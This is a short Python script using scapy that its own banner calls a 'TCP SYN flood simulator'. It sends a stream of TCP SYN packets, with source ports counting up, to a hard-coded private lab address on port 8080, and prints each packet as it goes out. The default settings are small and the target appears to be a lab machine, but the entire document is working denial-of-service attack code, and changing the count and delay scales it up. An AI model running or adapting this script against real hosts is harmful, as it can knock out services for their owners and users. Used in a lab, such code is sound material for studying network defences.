from scapy.all import IP, TCP, send
import time

TARGET = "192.168.56.105"
TARGET_PORT = 8080

PACKET_COUNT = 100
DELAY = 0.02

print("=" * 60)
print("          TCP SYN FLOOD SIMULATOR")
print("=" * 60)
print(f"Target      : {TARGET}")
print(f"Port        : {TARGET_PORT}")
print(f"Packets     : {PACKET_COUNT}")
print(f"Delay       : {DELAY} seconds")
print("=" * 60)

for i in range(PACKET_COUNT):

    packet = IP(dst=TARGET) / TCP(
        dport=TARGET_PORT,
        sport=40000 + i,
        flags="S"
    )

    send(
        packet,
        verbose=False
    )

    print(f"[SYN {i + 1:03d}] sent")

    time.sleep(DELAY)

print("\n[*] SYN simulation completed.")
